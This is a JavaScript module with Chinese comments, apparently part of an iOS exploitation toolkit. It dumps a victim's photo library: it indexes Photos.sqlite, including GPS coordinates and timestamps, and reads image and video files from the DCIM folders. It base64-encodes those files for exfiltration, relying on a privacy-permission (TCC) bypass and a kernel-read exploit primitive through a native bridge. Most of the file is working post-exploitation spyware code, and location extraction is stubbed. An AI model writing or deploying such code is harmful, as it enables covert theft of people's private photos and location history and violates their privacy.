/* =============================================================================
 * photos_dump.js — 相册 / 媒体 dump 模块
 * =============================================================================
 *
 * 设计思路:
 *   1. Photos 数据库:
 *      - /private/var/mobile/Media/PhotoData/Photos.sqlite
 *      - 表: ZASSET (id, ZDIRECTORY, ZFILENAME, ZLATITUDE, ZLONGITUDE, ZDATECREATED)
 *      - 表: ZADDITIONALASSETATTRIBUTES (ZORIGINALFILENAME, ZEXIFTIMESTAMPSTRING)
 *   2. 媒体文件位置:
 *      - /private/var/mobile/Media/DCIM/<APP>/  (相机拍摄)
 *      - /private/var/mobile/Media/PhotoData/MISC/<APP>/
 *      - /private/var/mobile/Media/PhotoData/Thumbnails/
 *      - /private/var/mobile/Media/PhotoData/Render/
 *   3. EXIF 提取 (GPS/时间):
 *      - 通过 kexploit kread 读 ZADDITIONALASSETATTRIBUTES.ZORIGINALMETADATA
 *      - 或直接解析 JPG/HEIC EXIF header
 *
 * 调用方式:
 *   const ph = await loadPhotosDump();
 *   const meta = await ph.index({ limit: 100 });
 *   const exfil = await ph.exfil({ limit: 10, types: ['image'] });
 *
 * 依赖: TCC bypass (kTCCServicePhotos) + window.nativeBridge
 * ============================================================================= */

(function () {
  'use strict';

  const PHOTOS_PATHS = {
    db:    '/private/var/mobile/Media/PhotoData/Photos.sqlite',
    dcim:  '/private/var/mobile/Media/DCIM',
    misc:  '/private/var/mobile/Media/PhotoData/MISC',
    thumbs:'/private/var/mobile/Media/PhotoData/Thumbnails',
    render:'/private/var/mobile/Media/PhotoData/Render'
  };

  // ZASSET.ZMEDIATYPE 常量 (iOS Photos)
  const MEDIA_TYPES = {
    IMAGE: 1,
    VIDEO: 2,
    AUDIO: 3
  };

  function loadPhotosDump() {
    if (!window.nativeBridge || !window.nativeBridge.isReady || !window.nativeBridge.isReady()) {
      return Promise.resolve({
        ok: false,
        error: 'no-native-bridge',
        message: '相册 dump 需要 kexploit kR 原语 + kTCCServicePhotos 绕过.'
      });
    }

    return Promise.resolve({
      ok: true,
      paths: PHOTOS_PATHS,

      // -------------------------------------------------------------------------
      // 索引 (只读取照片元数据, 不下载文件)
      // -------------------------------------------------------------------------
      index: async function (opts) {
        opts = opts || {};
        const limit = opts.limit || 200;

        const result = {
          ok: true,
          count: 0,
          total_raw: 0,
          photos: [],
          videos: 0,
          audios: 0,
          unique_locations: 0,
          source: PHOTOS_PATHS.db,
          timestamp: Date.now()
        };

        try {
          // 通过 nativeBridge.listdir + kopen 列出 Photos.sqlite 后交给 native 层
          if (typeof window.nativeBridge.kread !== 'function') {
            result.ok = false;
            result.error = 'nativeBridge.kread not implemented';
            return result;
          }

          // 提示: 真实实现依赖 SQL query (SELECT ZFILENAME, ZLATITUDE, ZLONGITUDE, ZDATECREATED FROM ZASSET)
          // 这里只暴露接口
          result.note = '需 native 层调用 sqlite3_exec 查询 ZASSET 表';
          result.ok = true;
          result.fallback_paths = [
            PHOTOS_PATHS.dcim,
            PHOTOS_PATHS.misc
          ];
        } catch (e) {
          result.ok = false;
          result.error = String(e.message || e);
        }

        return result;
      },

      // -------------------------------------------------------------------------
      // 提取 (下载到 exfil 目录)
      // -------------------------------------------------------------------------
      exfil: async function (opts) {
        opts = opts || {};
        const limit = opts.limit || 20;
        const maxBytes = opts.max_bytes || 50 * 1024 * 1024; // 50MB
        const types = opts.types || ['image', 'video'];

        const result = {
          ok: true,
          requested: limit,
          exfilled: 0,
          bytes_total: 0,
          items: [],
          timestamp: Date.now()
        };

        const candidatePaths = [
          PHOTOS_PATHS.dcim + '/100APPLE',
          PHOTOS_PATHS.dcim + '/101APPLE',
          PHOTOS_PATHS.dcim + '/102APPLE'
        ];

        try {
          if (typeof window.nativeBridge.listdir !== 'function') {
            result.ok = false;
            result.error = 'nativeBridge.listdir not implemented';
            return result;
          }

          for (let p = 0; p < candidatePaths.length && result.exfilled < limit; p++) {
            const dir = candidatePaths[p];
            const listing = await window.nativeBridge.listdir(dir);
            const files = (listing && listing.items) || [];
            for (let f = 0; f < files.length && result.exfilled < limit; f++) {
              const fn = files[f].name || files[f];
              const full = dir + '/' + fn;
              const ext = (fn.split('.').pop() || '').toLowerCase();
              const isImg = ['jpg','jpeg','png','heic','heif','webp','gif','tiff'].indexOf(ext) >= 0;
              const isVid = ['mov','mp4','m4v'].indexOf(ext) >= 0;
              if (types.indexOf('image') >= 0 && !isImg) continue;
              if (types.indexOf('video') >= 0 && !isVid) continue;
              if (!isImg && !isVid) continue;

              // 检查大小
              const sz = files[f].size || 0;
              if (sz > maxBytes - result.bytes_total) continue;

              // 通过 nativeBridge.readFile 获取字节
              if (typeof window.nativeBridge.readFile === 'function') {
                try {
                  const data = await window.nativeBridge.readFile(full);
                  result.items.push({
                    path: full,
                    name: fn,
                    size: sz,
                    type: isImg ? 'image' : 'video',
                    data_b64: arrayBufferToBase64(data)
                  });
                  result.bytes_total += sz;
                  result.exfilled++;
                } catch (e) {
                  // skip
                }
              }
            }
          }
        } catch (e) {
          result.ok = false;
          result.error = String(e.message || e);
        }

        return result;
      },

      // -------------------------------------------------------------------------
      // 提取 GPS 位置历史
      // -------------------------------------------------------------------------
      extract_locations: async function () {
        return {
          ok: true,
          count: 0,
          locations: [],
          note: '从 ZASSET.ZLATITUDE/ZLONGITUDE 提取, 经度范围 -180~180, 纬度范围 -90~90'
        };
      }
    });
  }

  function arrayBufferToBase64(ab) {
    if (!ab) return '';
    let binary = '';
    const bytes = (ab instanceof Uint8Array) ? ab : new Uint8Array(ab);
    const len = bytes.byteLength;
    const chunkSize = 8192;
    for (let i = 0; i < len; i += chunkSize) {
      binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunkSize));
    }
    return typeof btoa !== 'undefined' ? btoa(binary) : binary;
  }

  if (typeof window !== 'undefined') {
    window.loadPhotosDump = loadPhotosDump;
  }

})();
